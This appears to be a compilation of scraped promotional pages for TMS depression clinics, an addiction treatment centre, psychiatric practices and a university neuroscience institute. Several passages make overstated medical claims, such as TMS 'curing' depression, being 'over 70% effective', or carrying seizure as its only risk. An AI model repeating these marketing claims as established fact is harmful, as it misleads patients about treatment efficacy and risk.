        "self_description": "Transcranial magnetic stimulation (TMS) is a noninvasive procedure that uses magnetic fields to stimulate nerve cells in an area of the brain found to be underactive in people with Depression. TMS artificially stimulates an area about the size of a golf ball to improve symptoms of depression. TMS is typically used when other depression treatments haven’t been effective. TMS Therapy is indicated for the treatment of Major Depressive Disorder in adult patients who have failed to receive satisfactory improvement from prior antidepressant medication in the current episode. Repetitive transcranial magnetic stimulation (rTMS) uses a magnet to activate the brain. First developed in 1985, rTMS has been studied as a treatment for depression, anxiety, ocd, PTSD and many other disorders Transcranial magnetic stimulation (TMS) uses a targeted pulsed magnetic field, similar to what is used in an MRI (magnetic resonance imaging) machine. While the patient is awake and alert, TMS Therapy stimulates areas of the brain that are found to be underactive in people with depression. During an rTMS session, treatment coil is placed against your scalp near your forehead. The treatment coil delivers a magnetic pulse that stimulates nerve cells in the region of your brain involved in mood control and depression. Though the biology of why rTMS works isn’t completely understood, the stimulation appears to impact how the brain is working, which in turn seems to ease depression symptoms and improve mood. There are different ways to perform the procedure, and techniques may change as experts to learn more about the most effective ways to perform treatments. Please view the Video below for more information: Depression is a treatable condition, but for some people, standard treatments aren’t effective. Repetitive TMS is typically used when standard treatments such as medications and talk therapy (psychotherapy) don’t work. In 2008, rTMS was approved for use by the FDA as a treatment for major depression for patients who do not respond to at least one antidepressant medication in the current episode. The first clinical trial for TMS funded by NIMH, was published in 2010 found that 14% achieved remission with rTMS compared to 5% with an inactive (sham) treatment. After the trial ended, patients could enter a second phase in which everyone, including those who previously received the sham treatment, was given rTMS. Remission rates during the second phase climbed to nearly 30%. Clinical studies with over 900 people have shown that TMS may help achieve remission for people living with depression. TMS was included in the 2010 American Psychiatric Association (APA) Practice Guideline for the Treatment of Patients with Major Depression—guidelines that provide recommendations for how psychiatrists treat depression. Every day with depression is a struggle. When antidepressant medications aren’t working, it’s hard to know what to turn to next. Many people with Major Depressive Disorder have turned to TMS Therapy to take control of their depression. Hear their stories: Repetitive TMS is a noninvasive form of brain stimulation used for depression. Unlike vagus nerve stimulation or deep brain stimulation, rTMS does not require surgery or implantation of electrodes. rTMS doesn’t require sedation with anesthesia and does not cause memory loss. Generally, rTMS is considered safe and well-tolerated. However, it can cause some mild side effects. Because it is not a depression drug, NeuroStar TMS Therapy does not have the same side effects that are associated with traditional antidepressant medications. Unlike oral antidepressants that must travel through out the body before reaching the brain, TMS directly targets an area of the brain found to be underactive in people with depression. NeuroStar TMS Therapy is free of systemic side effects associated with oral antidepressant drugs. Side effects are generally mild to moderate and improve shortly after an individual treatment session and decrease over time with additional sessions. They may include: The FDA and the manufacture of the NeuroStar system have identified the following reasons a patient would not be able to receive TMS treatment.

TMS Devices at Siyan Clinical: What to Expect At Siyan Clinical, we offer Transcranial Magnetic Stimulation (TMS) treatment using three FDA-cleared devices. All are designed to safely and effectively treat depression and related conditions by delivering gentle magnetic pulses to specific areas of the brain involved in mood regulation. While each device has its own design and features, the treatment goals and outcomes are similar. Sessions are done on an outpatient basis, and patients remain fully awake throughout. These systems use a magnetic coil placed on the scalp to deliver repeated magnetic pulses (known as repetitive TMS or rTMS) to a key brain region involved in mood regulation. • Treatment time: Typically ranges from 19 to 37 minutes per session, depending on the protocol. • Patient experience: Most people feel a tapping sensation on the scalp that becomes more comfortable after a few sessions. • Use in practice: Both are widely used across clinics and research settings. This system uses a helmet-like coil to reach deeper brain structures involved in depression and anxiety. All TMS treatments at Siyan Clinical are non-invasive and do not require anesthesia or recovery time. We select treatment options based on clinical needs, patient preferences, and treatment goals—ensuring a personalized and comfortable experience for each individual. Siyan Clinical Corporation has qualified technicians for TMS Therapy. Come and meet our TMS specialized technician, that can guide you through the process involved in TMS Treatment. We can solve any query or questions you have about TMS treatment and is that right for you or not. If you agree with two or more of these statements, TMS Therapy may be right for you.

The patient’s neural pathways responsible for mood are stimulated by a magnetic field created by coils in the machine. The machine is placed over the patient’s head while they sit in a comfortable chair. The effects of TMS are long-lasting and have been tested and proven safe. If you have undergone shock therapy or electroconvulsive therapy (ECT) without success, this doesn’t eliminate you from TMS treatment. TMS requires no anesthesia and is a relatively simple procedure. A magnetic field generated from the coil is strategically placed on the patient’s head, then calibrated for each individual’s needs. The magnetic field passes through the skull and creates a current that affects the action of neurons in the brain responsible for facilitating mood. Long-term relief from a single cycle of treatment is very possible."

Practicing general adult psychiatry, D r. Taylor is experienced in treating all psychiatric disorders including major depression, generalized anxiety, panic disorder, PTSD, obsessive-compulsive disorder, impulse control disorders, bipolar disorders, schizophrenia spectrum disorders, neurocognitive disorders, ADHD, sleep disorders, personality disorders and substance use disorders. Office-Based Opioid Treatment (Suboxone) is also offered for those requiring medication-assisted treatment for Opioid Use Disorder. In-office Spravato (intranasal esketamine) administration is also being offered for treatment-resistant depression or MDD with suicidal ideation/behavior. He offers a complete psychiatric evaluation, including psychosocial assessment, discusses his clinical impressions with you, provides education about mental health syndromes, and makes recommendations for you based on current, evidence-based practice guidelines. Equally important, the risks and benefits of treatment, as well as the risks of not treating are also discussed.

In-office Spravato (intranasal esketamine) administration is also offered for treatment-resistant depression or major depression with suicidal ideation/behavior.

        "self_description": "We’re Here to Help Contact Us Verify Insurance Fountain Hills Recovery is a Licensed, Joint Commission Accredited Center that specializes in mental health treatment, dual diagnosis , drug addiction, and alcohol addiction . We incorporate many other forms of therapy in our care plans, such as EMDR, trauma, group therapy, family therapy, art therapy, and equine therapy, as well as meditation and yoga. Although our center can provide care for up to 90 individuals, our staff-to-patient ratio only allows a maximum of 8 patients to one therapist. As a result, therapists can provide the most concentrated care possible. We provide high-end care with a wide range of options for the most comprehensive care with long-lasting results. Our clinic overlooks the world-famous fountain nestled in the center of Fountain Hills Park, the namesake of our lovely town, which boasts peace and tranquility. We’ve put a lot of thought into choosing this location. We feel it’s integral to provide an environment that promotes healing in addition to the best possible treatment, clinical programs, and amenities when struggling with these debilitating issues. We provide two multi-million dollar homes as our living accommodations. The men reside in Vista house, a $3.9 million, 12,000-square-foot home with a movie theater, spa, gym, and elevator. The women reside in the 8,000-square-foot Sonoran house, which provides many of the same amenities as the male house. It sits on 11 acres of land with an unobstructed view of the fountain. Our In-Patient program here is optimum when seeking help for addiction and co-occurring disorders. The patient is removed from their everyday environment, away from the daily triggers that cause them pain or encourage their substance abuse. We bring them in, care for them, and provide them with the support and the compassion they deserve. “This is all dedicated to the memory of my father. Part of the passion that drives us and our business is knowing that we’re helping others target core issues that led them to abuse and provide them with life skills that will allow them to move forward and live healthier, more productive lives. Our staff is comprised of clinical and medical directors and behavioral and trauma therapists who are highly educated, trained, and experienced in addressing the underlying causes and conditions that led to the addiction. Many of our clients have dual diagnoses, i.e., PTSD and Bipolar, or depression and anxiety. This is part of what inspired us to offer mental health treatment at our location. We provide clients with a safe place to address their addiction(s)/issues thoroughly. It’s so rewarding to see those who graduate from our program and begin to reclaim their lives. It’s so fulfilling to see the changes within each person from the time they entered our program, desperate and overcome by the disease, to the time they graduate from our program renewed, educated, and ready to tackle life with a healthier perspective.” – Natalie Marston-Salem, Founder Our founders, Natalie Marston-Salem and John Salem, began Fountain Hills Recovery in honor of Natalie’s late father, Maurice. Through loss, they found hope, honor, and a deep compassion and desire to help others free themselves from addiction. My eyes well up when I think about my father, Maurice Marston, on what would have been his 67th birthday. I believe I could’ve done more to save his life. However, my Dad, the 30-year Fire Captain who saved lives for a living, was overtaken by his own battle with drugs and alcohol. As a result, we didn’t speak for years; however, before he died, we reunited for a very short time, for which I’ll be eternally grateful. After he passed away, I felt a lot of guilt. I’m not sure if guilt is the right word, as there was a little bit of denial about him having the issues as severe as he did. I wished I had tried harder to get him the help he needed. I wasn’t able to help my father with his struggles, and that will forever weigh heavy on me; however, going forward, my husband, John Salem, and I wanted to help others emerge from this downward spiral by founding Fountain Hills Recovery. Our initial goal was to bring awareness to first responders, firefighters, law enforcement officers, and veterans struggling with substance abuse issues. We quickly learned, however, that this disease does not discriminate based on your career or social status; it’s an epidemic that not only affects the individual struggling, but it affects their families as well. Since we opened in November 2016, we have seen many types of individuals seeking help for their addiction(s), anyone from doctors and lawyers to athletes and college students. The damage it causes families is devastating, which is why we strive to help as many people as possible heal from addiction. And now, we’ve expanded our services to include mental health treatment so that those struggling with mental health disorders can heal, too. Our goal at Fountain Hills Recovery is to help people overcome addiction and mental health disorders to live sober and more fulfilled lives. To achieve this goal, we focus on evidence-based methods and practices that lead to sustainable sobriety and mental wellness. Because each person’s struggle with addiction and mental health disorders is unique, we believe their treatment program should be as well. We will help you develop and meet your own recovery goals and realize your potential for a life of sobriety. Our holistic, integrated care team comprises clinical, medical, psychiatric, behavioral, and trauma therapists who have been working together for several years. Our team was handpicked for their strengths and has seen great success with this treatment modality. Utilizing this unique approach, we have successfully treated clients with failure to launch issues and repeated treatment attempts. We pride ourselves on helping clients be successful and having this be their last and only treatment attempt. We strongly incorporate action-based goals, transparent honesty, and a strong foundation of personal accountability into each client’s daily structure. We help each client find their own level of integrity, self-respect, and dignity. A treatment center cannot give this; we simply help the client find that in themselves. Begin your journey towards a life free from the grips of substance abuse and behavioral health disorders. \" * \" indicates required fields Δ 16872 E Avenue of the Fountains #204 Fountain Hills, AZ 85268 Privacy Policy 800.715.2004 Condition We Treat Treatments Programs Resources Locations About Us © 2025 Fountain Hills Recovery All Rights Reserved."

Brain Wellness Center offers integrative, comprehensive, compassionate care that results in long-term solutions for our clients. We specialize in uncovering the root causes of psychological symptoms while focusing on restoring healthy brain functions. At Brain Wellness Center, we recognize that in order to provide the best care for our patients, we must provide compassionate solutions that encompass both body and mind. Our in-depth assessments take into account both physical and psychological factors, and enable us to provide solutions to improve quality of life for all of our clients. We believe in integrative care, which means treating the whole person and not just the illness. Brain Wellness Center’s focus is on non-medication based treatments that create long-term solutions for our clients by addressing underlying issues, not just symptom reduction. While medication can be included as part of our treatment plans, our bioanalysis, qEEG Brain Mapping, and genetic testing all ensure that any medication prescribed will be the best fit for each client’s unique needs. We offer a variety of other services including: Our practice include psychiatrists, neurologists, and psychologists, with a focus on brain function, vitamin deficiencies, hormonal imbalance, and toxicity exposure. Many years of neurology experience enables us to quickly assess your qEEG brain map. Why is that important to your care? Consider this: The only known risk associated with TMS is seizure and we are able to reduce this risk by evaluating your qEEG/EEG. Our experienced neurologists carefully review the EEG for any signs of unusual activity to determine if a client may be at risk of experiencing this negative side effect and how to reduce it. We’re the only facility in northern California to couple qEEG brain mapping with dTMS to reduce the risk of this side effect. It allows us to customize treatment plans based on a client’s unique brain patterns and achieve improved outcomes for our clients. Your overall wellness is our priority. Here at Brain Wellness Center we believe that everybody should have access to our groundbreaking treatments. We have teamed up with Lendvious to make financing options available to our patients.

Douglas Brown, DC, DACNB, IFMCP is the owner of the Mind Performance Center, the first deep transcranial magnetic stimulation (DTMS) facility in the state of Alabama. Using various therapies, including deep TMS, neutraceuticals, pathway rehabilitation and functional medicine, Dr. Brown is thrilled to help patients in Foley, Daphne, Fairhope, Gulf Shores, Alabama, Florida, Louisiana, and around the world by telemedicine. Helping to restore quality of life; for themselves, their caregivers, and their families. After graduating from Birmingham-Southern College in 1990, Dr. Brown decided to pursue the chiropractic path to health care service. He earned his Doctor of Chiropractic from the Life University School of Chiropractic in Marietta, Georgia. Dr. Brown believes that no single educational pathway holds all of the answers and that chiropractic exposed him to effective forms of alternative medicine that have inspired him to become a perpetual researcher of the human body and measurably effective non-invasive treatments. Dr. Brown practiced chiropractic for nearly seven years before attending the Carrick Institute for Post Graduate Studies and completing a neurology fellowship in Cape Canaveral, Florida. He then went on to complete additional fellowship training in neurology at Baptist Medical Center/ Center for Neurological Disorders in Birmingham, Alabama. In 2018, Dr. Brown completed training in the Bredesen protocol for the reversal of Alzheimer's disease through The Institute for Functional Medicine. Dr Brown is also board certified in Functional Medicine through the Institute of Functional Medicine IFM. At Mind Performance Center, Dr. Brown specializes in deep transcranial magnetic stimulation, brain metabolic enhancement, and brain performance. He utilizes various therapeutic exercises to correct brain pathway imbalances, and by correcting pathways, patients get stronger, longer-lasting results. He also treats Attention Deficit with Hyperactivity Disorder (ADHD), Autism Spectrum Disorder (ASD), Post Traumatic Stress Disorder (PTSD), Traumatic Brain Injury (TBI), and learning disability for children and adults. For over five years, Dr. Brown researched DTMS and its potential for dramatic improvement in the quality of human life. In 2008, the FDA approved DTMS as an optional treatment for “treatment-resistant depression,” and Dr. Brown brought the Brainsway DTMS technology into his practice in December 2014. In 2019 Dr. Brown began his journey of completing his functional medicine training through the Institute of Functional Medicine.  By combining DTMS with corrective and restorative brain pathway treatments along with functional medicine and nutraceuticals, Dr. Brown has had the blessing of helping many patients return from treatment-resistant depression to leading active normal lives. Dr. Brown is board-certified in neurology and a Diplomate of the American Chiropractic Neurology Board. He is proud to serve patients in his community and lives for those awakening moments when the patient becomes fully alive and empowered with mental clarity from renewed brain functionality.

        "self_description": "HOME ABOUT MDD ABOUT TMS TMS VIDEOS CONTACT More Depression is a serious medical illness affecting an estimated 17.3 million American adults every year, 7.1% of all U.S. adults. 1 Often debilitating, depression results in a persistent state of sadness or loss of interest or pleasure which interferes with an individual's thoughts, behavior, mood, and physical health. To be diagnosed with major depressive disorder (sometimes called clinical depression or just MDD), you have to experience several distinct symptoms for most of the day, nearly every day, for at least two weeks. Depression can be lethal. In fact, each year in the US, nearly 45,000 people die by suicide.  Suicide was the second leading cause of death among individuals between the ages of 10 and 34, and the fourth leading cause of death among individuals between the ages of 35 and 54. 2 Suicide has been a persistent problem in Montana — and it’s getting worse. The state saw 25.9 suicides for every 100,000 residents in 2016, nearly double the national average, according to Centers for Disease Control and Prevention data that is age-adjusted. Since 1999, that rate has risen 38 percent ranking Montana number 1 in suicides per capita in the nation. 3 Overall, women are almost twice as likely as men to suffer from depression; however, some experts feel that depression in men may be under-reported. 4 Depression has no racial, ethnic or socioeconomic boundaries. About two-thirds of those who experience an episode of depression will have at least one other episode in their lives. ​ While the exact cause of depression is not known, the leading scientific theory is that depression is caused by decreased activity in the neural networks of the brain that regulate emotion and motivation. Increasing levels of neurotransmitters in the brain has been found to reactivate these neural networks, or create new networks. This is where TMS can help.  By targeting specific neuropathways and stimulating neurotransmitter production, TMS can improve and/or cure depression. ​ 1. https://www.nimh.nih.gov/health/statistics/major-depression.shtml 2. https://www.nimh.nih.gov/health/statistics/suicide.shtml 3. https://www.nbcnews.com/news/us-news/montana-had-highest-suicide-rate-country-then-budget-cuts-hit-n904246 4. https://jamanetwork.com/journals/jamapsychiatry/fullarticle/1733742 © Copyright 2020 TMS Missoula, LLC dba TMS Revitalizes Privacy Policy"

Disorders of the brain in particular exact a terrible toll on humankind at all ages of life. Almost everyone has personal experience with a major brain disorder, in themselves, an immediate family member, or a close friend. In the United States, data from several years ago indicated that over 50 million Americans had brain disorders, resulting in an annual economic cost of over $500 billion. More recent European data suggests that these figures are too low: 38% of that population suffers from brain disorders, at an annual economic cost of about $1 trillion (greater than the cost of cancer and heart disease combined). Mood disorders, dementia, and psychotic disorders topped the European list. While the impact of specific diseases differs in developed versus developing nations, brain disorders contribute massively to the burden of disease in all nations. According to a recent study funded by the Bill & Melinda Gates Foundation, stroke was the second leading cause of death worldwide in 2010. And nervous system disorders accounted for half of the top 20 worldwide causes of disability (12 of the top 20 if falls and road injury are counted, both of which commonly stem from brain problems such as motor or sensory impairment, alcohol addiction, or sleep disorders). The Stony Brook University Neuroscience Institute seeks to contribute to the great fight against nervous system disorders by providing world-class clinical care, by advancing the nature of this care through research, and by training the neuro-clinicians and neuroscientists of tomorrow. Our primary clinical responsibility is to provide 24/7 care to the residents of Suffolk County, which spans 86 miles on easternmost Long Island, and is home to 1.5 million people. Stony Brook University Hospital is the only tertiary medical center and Level 1 trauma center in Suffolk County, serving as a regional health care hub, with referral linkages or partnerships with multiple area community hospitals. But we also draw patients from well outside our region, who come to Stony Brook specifically to see some of our distinguished specialists. We diagnose and treat the full range of nervous system (brain, spinal cord, nerve, and muscle) disorders affecting both adults and children. These include stroke (our around-the-clock acute stroke service is recognized by the American Heart Association with a Gold Plus award), mood disorders, schizophrenia, addiction, aneurysms, spine problems, traumatic injuries, multiple sclerosis, amyotrophic lateral sclerosis, Alzheimer's disease, Parkinson's disease, epilepsy, sleep disorders, chronic pain, brain tumors, cerebral palsy and autism. The Neurosciences Institute aims to provide a framework for the interdisciplinary clinical integration of medical and surgical specialties, so our patients can benefit from the best approaches, independent of the departments involved. We also promote interdisciplinary research integration, as modern frontiers in neuroscience research have become too complex to be fully addressed by single labs, disciplines, or departments. Many questions are best addressed by teams of investigators, equipped with a broad array of tools, including genetics, molecular and cellular biology, electrophysiology, anatomy, neurochemistry, behavioral science, and imaging. Often, synergistic studies are conducted in parallel in basic research laboratories and in human subjects. And increasingly, neuroscience research engages the efforts of engineers, computer scientists, physicists, chemists, mathematicians, and statisticians, so the Neurosciences Institute benefits by being part of an outstanding larger university community with faculty experts in all of these disciplines. And the Institute is proud to collaborate in various ways with other outstanding institutions, some in our neighborhood (Cold Spring Harbor Labs; Brookhaven National Labs), some throughout the world. Research within the Neurosciences Institute has two main goals. First, to contribute to the development of the new diagnostic tests and more powerful therapies that patients world-wide need. And second, to advance fundamental understandings of ourselves and our minds. The nervous system is by far the most intricate part of the human body, responsible for all that we truly are: our consciousness, thoughts, memories, emotions, hopes, and dreams. It provides us with sensory inputs, allowing us to perceive the world around us; and motor capabilities, allowing us to act. Neuroscience research is now a national priority, an internal counterpart to the great external research frontier represented by the fields of physics and astronomy. Increasing our understanding of our brains and minds is essential to our hopes to transcend our limitations: to achieve more both individually and collectively, and to build more effective and just societies.

He enjoys spending time with his family, watching and coaching soccer, and hanging out in his backyard. Chewy has been a therapy dog since 2014 at the young age of 18 months. That is when he finally settled down and stopped destroying almost everything that came across his path. We believe he is a black Lab/Husky/Rottweiler mix. He is an extremely loving and slothful (better than calling him lazy?) dog that likes to lie on your feet and go right into REM sleep. Chewy is a valued member of the team at Rogue Valley TMS. He enjoys swimming, sleeping on his back with his legs up, laying around while the other dogs fetch, wrestling with his buddy Ani, chewing on bones, shedding on everything (lint roller provided at no extra cost), and giving kisses to his favorite people. Millie is the tiniest of our therapy dogs. When she’s at work, Millie has a calm energy that brings a sense of peace to all who meet her. During her free time, Millie enjoys being part of her pack, digging holes, chasing the other dogs while they’re playing fetch, getting major zoomies, and being close to her mama. Millie’s unique beauty and natural silver mohawk make almost everyone smile. LOCATED AT: 809 E Jackson St. Medford Oregon 97504 Phone: (541) 245-3614 *Parking is behind the blue building.

This non-invasive, FDA-approved treatment offers hope for individuals struggling with treatment-resistant depression and is covered by most insurance plans. With thousands of successful TMS treatments performed, our mission is to expand access to treatment for patients with depression and other mental health problems.

TMS is an FDA-approved treatment that uses magnetic pulses to stimulate the root cause of depression. It's safe, highly-effective, and covered by insurance.  Click below to schedule a free consultation with one of our DFW-area psychiatrists and learn more about the benefits of TMS. TMS , or transcranial magnetic stimulation , is an alternative treatment for a variety of mental health conditions, but it is most commonly used to treat major depression and anxiety. This non-invasive therapy involves using a targeted magnetic field to stimulate under-active neurons in specific parts of the brain. TMS therapy typically takes about 6 weeks and is over 70% effective for providing long-term relief from depression symptoms. Depression is caused by a lack of sufficient activity in the left dorsolateral prefrontal cortex, essentially the front left part of your brain. When this area is working properly, the entire brain lights up, creating an improved mood, working memory, and selective attention. TMS works by using magnetic fields to stimulate nerve cells in the brain. This is done by placing a magnetic coil near the head, which produces magnetic pulses that stimulate the nerve cells in the targeted area. TMS may be a good option for individuals who have not responded to traditional treatments for depression, such as medication and psychotherapy. However, it is important to speak with a mental health professional to determine if TMS is right for you. During TMS treatment, you can sit comfortably and perform passive activities like reading a book, watching TV, or listening to music. Most patients report that TMS treatment feels like a gentle tapping sensation on the skull. Some patients experience a tingling or scalp sensitivity at the stimulation site during treatment, which can typically be mitigated by placing the device at a slightly different angle. The most commonly reported side effects of TMS therapy include mild headache, scalp discomfort during stimulation, and lightheadedness, all of which are typically resolved shortly after the treatment session or within the first week. Many patients report no side effects at all. Yes, TMS therapy is covered by almost all major insurance companies, depending on your insurance plan. Insurance plans can also have requirements for coverage, such as a prior history of antidepressant medication use or therapy treatments. of patients show a clinically meaningful response after completing a full course of TMS. of patients experience complete remission of their depression, meaning their symptoms went away. TMS is a well-tolerated treatment with virtually no side effects commonly associated with medication. TMS targets depression at the source - medications taken orally typically have to pass through the blood-brain barrier, leading to side effects like gastrointestinal problems, insomnia, or weight gain. The only side effect to expect during your course is a slight sensation at the treatment site and - in rare cases - headaches. This is typically resolved after the first few treatments as your brain acclimates to the feeling. While you may feel a slight sensation on top of your head during treatment, nearly all patients adapt to the sensation within a session or two. You do not have to start a new medication regimen during TMS; this treatment is especially effective for those struggling with medication-resistant depression. An analysis of 1,753 patients showed that the average patient achieved a sustained response after just 16 sessions, or about 3 weeks of treatment. The first step in seeing if TMS therapy is right for your wellness journey is talking with a dedicated patient advocate on a complimentary phone call. These phone calls are all about you!
